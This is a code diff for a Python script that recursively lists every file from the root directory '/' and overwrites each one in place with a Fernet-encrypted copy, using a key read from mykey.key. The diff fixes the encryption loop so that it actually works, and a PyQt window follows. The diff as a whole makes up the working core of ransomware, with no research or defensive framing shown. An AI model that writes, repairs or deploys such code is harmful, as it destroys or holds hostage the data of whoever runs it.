@@ -12,6 +12,14 @@ f = Fernet(key)
 files = [None]
 def listdir():
     return getListOfFiles('/')
+
+def encrypt(filename, key):
+    f = Fernet(key)
+    with open(filename,"rb") as file:
+        file_data = file.read()
+        encrypted_data = f.encrypt(file_data)
+        with open(filename, "wb") as file:
+            file.write(encrypted_data)
 def getListOfFiles(dirName):
     listOfFile = os.listdir(dirName)
     allFiles = list()
@@ -25,12 +33,8 @@ def getListOfFiles(dirName):
     return allFiles
 
 for f in listdir():
-    with open(f, 'rb') as original_file:
-         original = original_file.read()
-
-    encrypted = f.encrypt(original)
-
-    original_file.write(encrypted)
+    fkey = open("mykey.key","rb")
+    encrypt(f, fkey.read())
 def window():
     app = QApplication(sys.argv)
     widget = QWidget()
